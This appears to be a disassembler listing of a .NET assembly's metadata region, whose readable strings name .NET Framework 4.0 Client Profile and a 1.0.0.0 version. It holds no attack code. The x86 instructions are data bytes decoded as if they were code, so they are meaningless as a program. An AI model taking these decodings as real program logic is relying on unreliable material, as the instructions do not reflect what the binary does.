  40c94a:	1c 03                	sbb    $0x3,%al
  40c94c:	06                   	push   %es
  40c94d:	12 60 0b             	adc    0xb(%eax),%ah
  40c950:	20 02                	and    %al,(%edx)
  40c952:	01 12                	add    %edx,(%edx)
  40c954:	60                   	pusha
  40c955:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c95a:	60                   	pusha
  40c95b:	04 20                	add    $0x20,%al
  40c95d:	00 12                	add    %dl,(%edx)
  40c95f:	60                   	pusha
  40c960:	05 20 01 12 60       	add    $0x60120120,%eax
  40c965:	0e                   	push   %cs
  40c966:	05 20 01 12 60       	add    $0x60120120,%eax
  40c96b:	0a 05 20 01 12 60    	or     0x60120120,%al
  40c971:	0d 05 20 01 12       	or     $0x12012005,%eax
  40c976:	60                   	pusha
  40c977:	08 03                	or     %al,(%ebx)
  40c979:	20 00                	and    %al,(%eax)
  40c97b:	08 05 28 01 12 60    	or     %al,0x60120128
  40c981:	08 03                	or     %al,(%ebx)
  40c983:	28 00                	sub    %al,(%eax)
  40c985:	08 03                	or     %al,(%ebx)
  40c987:	06                   	push   %es
  40c988:	11 64 03 06          	adc    %esp,0x6(%ebx,%eax,1)
  40c98c:	12 5c 04 20          	adc    0x20(%esp,%eax,1),%bl
  40c990:	01 08                	add    %ecx,(%eax)
  40c992:	0e                   	push   %cs
  40c993:	05 20 01 01 12       	add    $0x12010120,%eax
  40c998:	61                   	popa
  40c999:	04 20                	add    $0x20,%al
  40c99b:	01 01                	add    %eax,(%ecx)
  40c99d:	0a 04 20             	or     (%eax,%eiz,1),%al
  40c9a0:	01 01                	add    %eax,(%ecx)
  40c9a2:	0b 03                	or     (%ebx),%eax
  40c9a4:	20 00                	and    %al,(%eax)
  40c9a6:	0b 03                	or     (%ebx),%eax
  40c9a8:	20 00                	and    %al,(%eax)
  40c9aa:	0a 03                	or     (%ebx),%al
  40c9ac:	20 00                	and    %al,(%eax)
  40c9ae:	0d 05 20 01 01       	or     $0x1012005,%eax
  40c9b3:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40c9b8:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40c9bd:	01 0e                	add    %ecx,(%esi)
  40c9bf:	0e                   	push   %cs
  40c9c0:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c9c5:	08 04 20             	or     %al,(%eax,%eiz,1)
  40c9c8:	01 02                	add    %eax,(%edx)
  40c9ca:	0e                   	push   %cs
  40c9cb:	03 20                	add    (%eax),%esp
  40c9cd:	00 0e                	add    %cl,(%esi)
  40c9cf:	04 20                	add    $0x20,%al
  40c9d1:	01 01                	add    %eax,(%ecx)
  40c9d3:	02 04 20             	add    (%eax,%eiz,1),%al
  40c9d6:	01 01                	add    %eax,(%ecx)
  40c9d8:	0c 04                	or     $0x4,%al
  40c9da:	20 01                	and    %al,(%ecx)
  40c9dc:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40c9e2:	5c                   	pop    %esp
  40c9e3:	04 20                	add    $0x20,%al
  40c9e5:	00 11                	add    %dl,(%ecx)
  40c9e7:	64 04 20             	fs add $0x20,%al
  40c9ea:	00 12                	add    %dl,(%edx)
  40c9ec:	59                   	pop    %ecx
  40c9ed:	03 28                	add    (%eax),%ebp
  40c9ef:	00 0e                	add    %cl,(%esi)
  40c9f1:	03 28                	add    (%eax),%ebp
  40c9f3:	00 0a                	add    %cl,(%edx)
  40c9f5:	03 28                	add    (%eax),%ebp
  40c9f7:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40c9fd:	5c                   	pop    %esp
  40c9fe:	04 28                	add    $0x28,%al
  40ca00:	00 11                	add    %dl,(%ecx)
  40ca02:	64 04 00             	fs add $0x0,%al
  40ca05:	00 00                	add    %al,(%eax)
  40ca07:	00 04 03             	add    %al,(%ebx,%eax,1)
  40ca0a:	00 00                	add    %al,(%eax)
  40ca0c:	00 04 04             	add    %al,(%esp,%eax,1)
  40ca0f:	00 00                	add    %al,(%eax)
  40ca11:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40ca18:	06                   	push   %es
  40ca19:	00 00                	add    %al,(%eax)
  40ca1b:	00 04 07             	add    %al,(%edi,%eax,1)
  40ca1e:	00 00                	add    %al,(%eax)
  40ca20:	00 04 08             	add    %al,(%eax,%ecx,1)
  40ca23:	00 00                	add    %al,(%eax)
  40ca25:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40ca28:	00 00                	add    %al,(%eax)
  40ca2a:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40ca2d:	00 00                	add    %al,(%eax)
  40ca2f:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40ca32:	00 00                	add    %al,(%eax)
  40ca34:	00 06                	add    %al,(%esi)
  40ca36:	00 02                	add    %al,(%edx)
  40ca38:	0e                   	push   %cs
  40ca39:	12 61 08             	adc    0x8(%ecx),%ah
  40ca3c:	05 00 01 0e 12       	add    $0x120e0100,%eax
  40ca41:	61                   	popa
  40ca42:	06                   	push   %es
  40ca43:	00 02                	add    %al,(%edx)
  40ca45:	0e                   	push   %cs
  40ca46:	05 12 61 05 00       	add    $0x56112,%eax
  40ca4b:	01 01                	add    %eax,(%ecx)
  40ca4d:	12 61 06             	adc    0x6(%ecx),%ah
  40ca50:	00 02                	add    %al,(%edx)
  40ca52:	01 12                	add    %edx,(%edx)
  40ca54:	61                   	popa
  40ca55:	0e                   	push   %cs
  40ca56:	07                   	pop    %es
  40ca57:	00 02                	add    %al,(%edx)
  40ca59:	01 12                	add    %edx,(%edx)
  40ca5b:	61                   	popa
  40ca5c:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  40ca61:	01 12                	add    %edx,(%edx)
  40ca63:	61                   	popa
  40ca64:	0d 06 00 02 01       	or     $0x1020006,%eax
  40ca69:	12 61 0c             	adc    0xc(%ecx),%ah
  40ca6c:	06                   	push   %es
  40ca6d:	00 02                	add    %al,(%edx)
  40ca6f:	01 12                	add    %edx,(%edx)
  40ca71:	61                   	popa
  40ca72:	02 06                	add    (%esi),%al
  40ca74:	00 02                	add    %al,(%edx)
  40ca76:	01 12                	add    %edx,(%edx)
  40ca78:	61                   	popa
  40ca79:	0b 06                	or     (%esi),%eax
  40ca7b:	00 02                	add    %al,(%edx)
  40ca7d:	01 12                	add    %edx,(%edx)
  40ca7f:	61                   	popa
  40ca80:	0a 03                	or     (%ebx),%al
  40ca82:	06                   	push   %es
  40ca83:	11 78 04             	adc    %edi,0x4(%eax)
  40ca86:	20 01                	and    %al,(%ecx)
  40ca88:	01 08                	add    %ecx,(%eax)
  40ca8a:	08 01                	or     %al,(%ecx)
  40ca8c:	00 08                	add    %cl,(%eax)
  40ca8e:	00 00                	add    %al,(%eax)
  40ca90:	00 00                	add    %al,(%eax)
  40ca92:	00 1e                	add    %bl,(%esi)
  40ca94:	01 00                	add    %eax,(%eax)
  40ca96:	01 00                	add    %eax,(%eax)
  40ca98:	54                   	push   %esp
  40ca99:	02 16                	add    (%esi),%dl
  40ca9b:	57                   	push   %edi
  40ca9c:	72 61                	jb     0x40caff
  40ca9e:	70 4e                	jo     0x40caee
  40caa0:	6f                   	outsl  %ds:(%esi),(%dx)
  40caa1:	6e                   	outsb  %ds:(%esi),(%dx)
  40caa2:	45                   	inc    %ebp
  40caa3:	78 63                	js     0x40cb08
  40caa5:	65 70 74             	gs jo  0x40cb1c
  40caa8:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40caaf:	77 73                	ja     0x40cb24
  40cab1:	01 05 20 01 01 11    	add    %eax,0x11010120
  40cab7:	71 08                	jno    0x40cac1
  40cab9:	01 00                	add    %eax,(%eax)
  40cabb:	02 00                	add    (%eax),%al
  40cabd:	00 00                	add    %al,(%eax)
  40cabf:	00 00                	add    %al,(%eax)
  40cac1:	05 01 00 00 00       	add    $0x1,%eax
  40cac6:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40cac9:	00 07                	add    %al,(%edi)
  40cacb:	31 2e                	xor    %ebp,(%esi)
  40cacd:	30 2e                	xor    %ch,(%esi)
  40cacf:	30 2e                	xor    %ch,(%esi)
  40cad1:	30 00                	xor    %al,(%eax)
  40cad3:	00 65 01             	add    %ah,0x1(%ebp)
  40cad6:	00 29                	add    %ch,(%ecx)
  40cad8:	2e 4e                	cs dec %esi
  40cada:	45                   	inc    %ebp
  40cadb:	54                   	push   %esp
  40cadc:	46                   	inc    %esi
  40cadd:	72 61                	jb     0x40cb40
  40cadf:	6d                   	insl   (%dx),%es:(%edi)
  40cae0:	65 77 6f             	gs ja  0x40cb52
  40cae3:	72 6b                	jb     0x40cb50
  40cae5:	2c 56                	sub    $0x56,%al
  40cae7:	65 72 73             	gs jb  0x40cb5d
  40caea:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40caf1:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40caf4:	72 6f                	jb     0x40cb65
  40caf6:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40cafd:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40cb04:	0e                   	push   %cs
  40cb05:	14 46                	adc    $0x46,%al
  40cb07:	72 61                	jb     0x40cb6a
  40cb09:	6d                   	insl   (%dx),%es:(%edi)
  40cb0a:	65 77 6f             	gs ja  0x40cb7c
  40cb0d:	72 6b                	jb     0x40cb7a
  40cb0f:	44                   	inc    %esp
  40cb10:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40cb17:	61                   	popa
  40cb18:	6d                   	insl   (%dx),%es:(%edi)
  40cb19:	65 1f                	gs pop %ds
  40cb1b:	2e 4e                	cs dec %esi
  40cb1d:	45                   	inc    %ebp
  40cb1e:	54                   	push   %esp
  40cb1f:	20 46 72             	and    %al,0x72(%esi)
  40cb22:	61                   	popa
  40cb23:	6d                   	insl   (%dx),%es:(%edi)
  40cb24:	65 77 6f             	gs ja  0x40cb96
  40cb27:	72 6b                	jb     0x40cb94
  40cb29:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40cb2c:	43                   	inc    %ebx
  40cb2d:	6c                   	insb   (%dx),%es:(%edi)
  40cb2e:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40cb35:	6f                   	outsl  %ds:(%esi),(%dx)
  40cb36:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40cb3d:	04 49                	add    $0x49,%al
  40cb3f:	74 65                	je     0x40cba6
  40cb41:	6d                   	insl   (%dx),%es:(%edi)
  40cb42:	00 00                	add    %al,(%eax)
  40cb44:	03 07                	add    (%edi),%eax
  40cb46:	01 08                	add    %ecx,(%eax)
  40cb48:	04 00                	add    $0x0,%al
  40cb4a:	01 08                	add    %ecx,(%eax)
  40cb4c:	0e                   	push   %cs
  40cb4d:	03 07                	add    (%edi),%eax
  40cb4f:	01 02                	add    %eax,(%edx)
  40cb51:	05 00 00 12 80       	add    $0x80120000,%eax
  40cb56:	b1 05                	mov    $0x5,%cl
  40cb58:	20 01                	and    %al,(%ecx)
  40cb5a:	0e                   	push   %cs
  40cb5b:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40cb60:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
  40cb66:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40cb6c:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40cb71:	03 02                	add    (%edx),%eax
  40cb73:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40cb78:	14 07                	adc    $0x7,%al
  40cb7a:	08 0e                	or     %cl,(%esi)
  40cb7c:	08 1d 12 80 c9 08    	or     %bl,0x8c98012
  40cb82:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40cb88:	12 80 d1 1d 0e 0c    	adc    0xc0e1dd1(%eax),%al
  40cb8e:	20 03                	and    %al,(%ebx)
  40cb90:	01 11                	add    %edx,(%ecx)
  40cb92:	80 d5 11             	adc    $0x11,%ch
  40cb95:	80 d9 11             	sbb    $0x11,%cl
  40cb98:	80 dd 05             	sbb    $0x5,%ch
  40cb9b:	00 02                	add    %al,(%edx)
  40cb9d:	02 0e                	add    (%esi),%cl
  40cb9f:	0e                   	push   %cs
  40cba0:	06                   	push   %es
  40cba1:	20 01                	and    %al,(%ecx)
  40cba3:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40cba8:	20 01                	and    %al,(%ecx)
  40cbaa:	08 08                	or     %cl,(%eax)
  40cbac:	07                   	pop    %es
  40cbad:	00 01                	add    %al,(%ecx)
  40cbaf:	1d 12 80 c9 0e       	sbb    $0xec98012,%eax
  40cbb4:	07                   	pop    %es
  40cbb5:	20 02                	and    %al,(%edx)
  40cbb7:	01 12                	add    %edx,(%edx)
  40cbb9:	80 c9 08             	or     $0x8,%cl
  40cbbc:	06                   	push   %es
  40cbbd:	20 01                	and    %al,(%ecx)
  40cbbf:	01 12                	add    %edx,(%edx)
  40cbc1:	80 f1 09             	xor    $0x9,%cl
  40cbc4:	20 02                	and    %al,(%edx)
  40cbc6:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40cbcb:	80 f5 05             	xor    $0x5,%ch
  40cbce:	20 02                	and    %al,(%edx)
  40cbd0:	08 08                	or     %cl,(%eax)
  40cbd2:	08 06                	or     %al,(%esi)
  40cbd4:	20 02                	and    %al,(%edx)
  40cbd6:	01 12                	add    %edx,(%edx)
  40cbd8:	0d 02 05 20 02       	or     $0x2200502,%eax
  40cbdd:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40cbe0:	09 20                	or     %esp,(%eax)
  40cbe2:	03 01                	add    (%ecx),%eax
  40cbe4:	12 61 02             	adc    0x2(%ecx),%ah
  40cbe7:	12 81 01 05 20 00    	adc    0x200501(%ecx),%al
  40cbed:	12 81 05 0b 20 04    	adc    0x4200b05(%ecx),%al
  40cbf3:	01 0e                	add    %ecx,(%esi)
  40cbf5:	12 81 09 11 81 0d    	adc    0xd811109(%ecx),%al
  40cbfb:	02 09                	add    (%ecx),%cl
  40cbfd:	20 04 01             	and    %al,(%ecx,%eax,1)
  40cc00:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40cc06:	0c 20                	or     $0x20,%al
  40cc08:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40cc0d:	08 08                	or     %cl,(%eax)
  40cc0f:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40cc15:	01 11                	add    %edx,(%ecx)
  40cc17:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40cc1d:	02 12                	add    (%edx),%dl
  40cc1f:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40cc22:	02 08                	add    (%eax),%cl
  40cc24:	08 05 20 01 08 12    	or     %al,0x12080120
  40cc2a:	25 06 00 02 08       	and    $0x8020006,%eax
  40cc2f:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40cc34:	03 08                	add    (%eax),%ecx
  40cc36:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40cc3b:	20 01                	and    %al,(%ecx)
  40cc3d:	01 12                	add    %edx,(%edx)
  40cc3f:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40cc45:	1c 0c                	sbb    $0xc,%al
  40cc47:	07                   	pop    %es
  40cc48:	06                   	push   %es
  40cc49:	1c 02                	sbb    $0x2,%al
  40cc4b:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40cc50:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40cc56:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40cc59:	02 07                	add    (%edi),%al
  40cc5b:	20 02                	and    %al,(%edx)
  40cc5d:	02 08                	add    (%eax),%cl
  40cc5f:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40cc65:	01 1d 05 08 08 1a    	add    %ebx,0x1a080805
  40cc6b:	07                   	pop    %es
  40cc6c:	0a 12                	or     (%edx),%dl
  40cc6e:	81 3d 0e 1d 12 81 41 	cmpl   $0x81120841,0x81121d0e
  40cc75:	08 12 81 
  40cc78:	41                   	inc    %ecx
  40cc79:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40cc7f:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40cc84:	4d                   	dec    %ebp
  40cc85:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40cc8a:	0e                   	push   %cs
  40cc8b:	05 00 00 12 81       	add    $0x81120000,%eax
  40cc90:	41                   	inc    %ecx
  40cc91:	05 20 00 12 81       	add    $0x81120020,%eax
  40cc96:	55                   	push   %ebp
  40cc97:	06                   	push   %es
  40cc98:	00 00                	add    %al,(%eax)
  40cc9a:	1d 12 81 41 05       	sbb    $0x5418112,%eax
  40cc9f:	00 01                	add    %al,(%ecx)
  40cca1:	0e                   	push   %cs
  40cca2:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  40cca7:	01 11                	add    %edx,(%ecx)
  40cca9:	81 5d 08 00 01 12 81 	sbbl   $0x81120100,0x8(%ebp)
  40ccb0:	41                   	inc    %ecx
  40ccb1:	12 81 45 04 06 12    	adc    0x12060445(%ecx),%al
  40ccb7:	81 49 09 20 02 12 81 	orl    $0x81120220,0x9(%ecx)
  40ccbe:	49                   	dec    %ecx
  40ccbf:	0e                   	push   %cs
  40ccc0:	11 81 69 06 00 03    	adc    %eax,0x3000669(%ecx)
  40ccc6:	0e                   	push   %cs
  40ccc7:	0e                   	push   %cs
  40ccc8:	0e                   	push   %cs
  40ccc9:	0e                   	push   %cs
  40ccca:	05 20 02 01 0e       	add    $0xe010220,%eax
  40cccf:	1c 07                	sbb    $0x7,%al
  40ccd1:	20 02                	and    %al,(%edx)
  40ccd3:	01 0e                	add    %ecx,(%esi)
  40ccd5:	11 81 75 04 07 02    	adc    %eax,0x2070475(%ecx)
  40ccdb:	0a 02                	or     (%edx),%al
  40ccdd:	10 07                	adc    %al,(%edi)
  40ccdf:	06                   	push   %es
  40cce0:	12 81 85 12 81 89    	adc    -0x767eed7b(%ecx),%al
  40cce6:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  40ccec:	0e                   	push   %cs
  40cced:	02 05 20 00 12 81    	add    0x81120020,%al
  40ccf3:	89 05 20 00 12 81    	mov    %eax,0x81120020
  40ccf9:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40ccff:	91                   	xchg   %eax,%ecx
  40cd00:	04 20                	add    $0x20,%al
  40cd02:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40cd05:	04 07                	add    $0x7,%al
  40cd07:	02 02                	add    (%edx),%al
  40cd09:	02 03                	add    (%ebx),%al
  40cd0b:	20 00                	and    %al,(%eax)
  40cd0d:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40cd10:	02 18                	add    (%eax),%bl
  40cd12:	02 03                	add    (%ebx),%al
  40cd14:	07                   	pop    %es
  40cd15:	01 0e                	add    %ecx,(%esi)
  40cd17:	05 00 00 12 81       	add    $0x81120000,%eax
  40cd1c:	9d                   	popf
  40cd1d:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40cd22:	1c 0a                	sbb    $0xa,%al
  40cd24:	07                   	pop    %es
  40cd25:	05 1d 05 12 35       	add    $0x3512051d,%eax
  40cd2a:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40cd2f:	20 01                	and    %al,(%ecx)
  40cd31:	12 35 0e 05 20 02    	adc    0x220050e,%dh
  40cd37:	0e                   	push   %cs
  40cd38:	08 08                	or     %cl,(%eax)
  40cd3a:	06                   	push   %es
  40cd3b:	07                   	pop    %es
  40cd3c:	02 02                	add    (%edx),%al
  40cd3e:	11 81 ad 05 20 02    	adc    %eax,0x22005ad(%ecx)
  40cd44:	0e                   	push   %cs
  40cd45:	0e                   	push   %cs
  40cd46:	0e                   	push   %cs
  40cd47:	05 20 00 11 81       	add    $0x81110020,%eax
  40cd4c:	ad                   	lods   %ds:(%esi),%eax
  40cd4d:	05 00 00 12 81       	add    $0x81120000,%eax
  40cd52:	b9 06 20 01 01       	mov    $0x1012006,%ecx
  40cd57:	12 81 b9 06 20 01    	adc    0x12006b9(%ecx),%al
  40cd5d:	02 11                	add    (%ecx),%dl
  40cd5f:	81 c1 11 07 05 12    	add    $0x12050711,%ecx
  40cd65:	81 85 15 12 41 01 0e 	addl   $0x8d81120e,0x1411215(%ebp)
  40cd6c:	12 81 8d 
  40cd6f:	12 81 91 0e 05 15    	adc    0x15050e91(%ecx),%al
  40cd75:	12 41 01             	adc    0x1(%ecx),%al
  40cd78:	0e                   	push   %cs
  40cd79:	05 20 01 01 13       	add    $0x13010120,%eax
  40cd7e:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40cd84:	00 06                	add    %al,(%esi)
  40cd86:	00 02                	add    %al,(%edx)
  40cd88:	0e                   	push   %cs
  40cd89:	0e                   	push   %cs
  40cd8a:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40cd8f:	1d 12 29 08 12       	sbb    $0x12082912,%eax
  40cd94:	29 05 00 00 1d 12    	sub    %eax,0x121d0000
  40cd9a:	29 05 20 00 11 81    	sub    %eax,0x81110020
  40cda0:	c5 09                	lds    (%ecx),%ecx
  40cda2:	00 02                	add    %al,(%edx)
  40cda4:	02 11                	add    (%ecx),%dl
  40cda6:	81 c5 11 81 c5 05    	add    $0x5c58111,%ebp
  40cdac:	07                   	pop    %es
  40cdad:	02 12                	add    (%edx),%dl
  40cdaf:	35 0e 07 20 03       	xor    $0x320070e,%eax
  40cdb4:	01 02                	add    %eax,(%edx)
  40cdb6:	0e                   	push   %cs
  40cdb7:	10 02                	adc    %al,(%edx)
  40cdb9:	06                   	push   %es
  40cdba:	00 01                	add    %al,(%ecx)
  40cdbc:	01 12                	add    %edx,(%edx)
  40cdbe:	81 cd 06 07 02 12    	or     $0x12020706,%ebp
  40cdc4:	81 49 02 08 20 03 01 	orl    $0x1032008,0x2(%ecx)
  40cdcb:	0e                   	push   %cs
  40cdcc:	1c 11                	sbb    $0x11,%al
  40cdce:	81 d5 07 07 02 12    	adc    $0x12020707,%ebp
  40cdd4:	81 49 1d 05 06 20 01 	orl    $0x1200605,0x1d(%ecx)
  40cddb:	12 81 49 0e 02 1d    	adc    0x1d020e49(%ecx),%al
  40cde1:	05 07 20 02 12       	add    $0x12022007,%eax
  40cde6:	81 49 0e 02 0e 07 04 	orl    $0x4070e02,0xe(%ecx)
  40cded:	12 60 0e             	adc    0xe(%eax),%ah
  40cdf0:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40cdf5:	12 60 12             	adc    0x12(%eax),%ah
  40cdf8:	60                   	pusha
  40cdf9:	06                   	push   %es
  40cdfa:	15 12 41 01 12       	adc    $0x12014112,%eax
  40cdff:	60                   	pusha
  40ce00:	10 10                	adc    %dl,(%eax)
  40ce02:	01 01                	add    %eax,(%ecx)
  40ce04:	15 12 41 01 1e       	adc    $0x1e014112,%eax
  40ce09:	00 15 12 81 e1 01    	add    %dl,0x1e18112
  40ce0f:	1e                   	push   %ds
  40ce10:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40ce13:	01 12                	add    %edx,(%edx)
  40ce15:	60                   	pusha
  40ce16:	09 20                	or     %esp,(%eax)
  40ce18:	00 15 11 81 d9 01    	add    %dl,0x1d98111
  40ce1e:	13 00                	adc    (%eax),%eax
  40ce20:	07                   	pop    %es
  40ce21:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40ce26:	12 60 04             	adc    0x4(%eax),%ah
  40ce29:	20 00                	and    %al,(%eax)
  40ce2b:	13 00                	adc    (%eax),%eax
  40ce2d:	05 20 01 02 13       	add    $0x13020120,%eax
  40ce32:	00 03                	add    %al,(%ebx)
  40ce34:	07                   	pop    %es
  40ce35:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  40ce3c:	e5 07                	in     $0x7,%eax
  40ce3e:	20 01                	and    %al,(%ecx)
  40ce40:	12 81 e9 1d 05 06    	adc    0x6051de9(%ecx),%al
  40ce46:	20 01                	and    %al,(%ecx)
  40ce48:	12 81 ed 0e 06 00    	adc    0x60eed(%ecx),%al
  40ce4e:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40ce51:	81 ed 08 00 01 12    	sub    $0x12010008,%ebp
  40ce57:	81 ed 11 81 f5 09    	sub    $0x9f58111,%ebp
  40ce5d:	00 02                	add    %al,(%edx)
  40ce5f:	12 81 f9 11 81 fd    	adc    -0x27eee07(%ecx),%al
  40ce65:	0e                   	push   %cs
  40ce66:	1c 00                	sbb    $0x0,%al
  40ce68:	05 12 82 05 11       	add    $0x11058212,%eax
  40ce6d:	82 09 0e             	orb    $0xe,(%ecx)
  40ce70:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40ce75:	12 81 ed 12 81 ed    	adc    -0x127eed13(%ecx),%al
  40ce7b:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40ce80:	12 81 f9 17 15 12    	adc    0x121517f9(%ecx),%al
  40ce86:	45                   	inc    %ebp
  40ce87:	01 15 12 49 0a 12    	add    %edx,0x120a4912
  40ce8d:	4d                   	dec    %ebp
  40ce8e:	1c 12                	sbb    $0x12,%al
  40ce90:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40ce95:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40ce9a:	0e                   	push   %cs
  40ce9b:	0b 00                	or     (%eax),%eax
  40ce9d:	01 15 12 45 01 13    	add    %edx,0x13014512
  40cea3:	00 12                	add    %dl,(%edx)
  40cea5:	82 05 03 06 13 00 13 	addb   $0x13,0x130603
  40ceac:	15 12 49 0a 12       	adc    $0x120a4912,%eax
  40ceb1:	4d                   	dec    %ebp
  40ceb2:	1c 12                	sbb    $0x12,%al
  40ceb4:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40ceb9:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40cebe:	0e                   	push   %cs
  40cebf:	17                   	pop    %ss
  40cec0:	20 0a                	and    %cl,(%edx)
  40cec2:	01 13                	add    %edx,(%ebx)
  40cec4:	00 13                	add    %dl,(%ebx)
  40cec6:	01 13                	add    %edx,(%ebx)
  40cec8:	02 13                	add    (%ebx),%dl
  40ceca:	03 13                	add    (%ebx),%edx
  40cecc:	04 13                	add    $0x13,%al
  40cece:	05 13 06 13 07       	add    $0x7130613,%eax
  40ced3:	13 08                	adc    (%eax),%ecx
  40ced5:	13 09                	adc    (%ecx),%ecx
  40ced7:	05 07 01 12 82       	add    $0x82120107,%eax
  40cedc:	0d 07 20 03 01       	or     $0x1032007,%eax
  40cee1:	0e                   	push   %cs
  40cee2:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40cee7:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40ceed:	06                   	push   %es
  40ceee:	12 81 2d 12 82 19    	adc    0x1982122d(%ecx),%al
  40cef4:	12 82 1d 12 82 21    	adc    0x2182121d(%edx),%al
  40cefa:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40ceff:	20 01                	and    %al,(%ecx)
  40cf01:	01 11                	add    %edx,(%ecx)
  40cf03:	82 2d 06 20 01 01 11 	subb   $0x11,0x1012006
  40cf0a:	82 31 05             	xorb   $0x5,(%ecx)
  40cf0d:	20 00                	and    %al,(%eax)
  40cf0f:	12 82 35 0b 20 03    	adc    0x3200b35(%edx),%al
  40cf15:	01 12                	add    %edx,(%edx)
  40cf17:	61                   	popa
  40cf18:	12 82 35 11 82 39    	adc    0x39821135(%edx),%al
  40cf1e:	08 20                	or     %ah,(%eax)
  40cf20:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40cf26:	08 1a                	or     %bl,(%edx)
  40cf28:	07                   	pop    %es
  40cf29:	0a 12                	or     (%edx),%dl
  40cf2b:	81 2d 12 82 19 12 82 	subl   $0x51d2182,0x12198212
  40cf32:	21 1d 05 
  40cf35:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40cf3a:	82 1d 1d 05 1d 05 1d 	sbbb   $0x1d,0x51d051d
  40cf41:	05 0c 00 05 01       	add    $0x105000c,%eax
  40cf46:	12 82 45 08 12 82    	adc    -0x7dedf7bb(%edx),%al
  40cf4c:	45                   	inc    %ebp
  40cf4d:	08 08                	or     %cl,(%eax)
  40cf4f:	04 07                	add    $0x7,%al
  40cf51:	02 02                	add    (%edx),%al
  40cf53:	08 09                	or     %cl,(%ecx)
  40cf55:	00 02                	add    %al,(%edx)
  40cf57:	01 12                	add    %edx,(%edx)
  40cf59:	82 45 11 82          	addb   $0x82,0x11(%ebp)
  40cf5d:	4d                   	dec    %ebp
  40cf5e:	0d 07 06 1d 05       	or     $0x51d0607,%eax
  40cf63:	12 82 51 12 35 1d    	adc    0x1d351251(%edx),%al
  40cf69:	05 08 05 07 07       	add    $0x7070508,%eax
  40cf6e:	02 12                	add    (%edx),%dl
  40cf70:	82 51 1d 05          	adcb   $0x5,0x1d(%ecx)
  40cf74:	08 07                	or     %al,(%edi)
  40cf76:	04 12                	add    $0x12,%al
  40cf78:	35 1d 05 08 05       	xor    $0x508051d,%eax
  40cf7d:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40cf82:	1c 06                	sbb    $0x6,%al
  40cf84:	07                   	pop    %es
  40cf85:	03 1d 05 08 08 05    	add    0x5080805,%ebx
  40cf8b:	20 01                	and    %al,(%ecx)
  40cf8d:	13 00                	adc    (%eax),%eax
  40cf8f:	08 04 07             	or     %al,(%edi,%eax,1)
  40cf92:	01 12                	add    %edx,(%edx)
  40cf94:	60                   	pusha
  40cf95:	0e                   	push   %cs
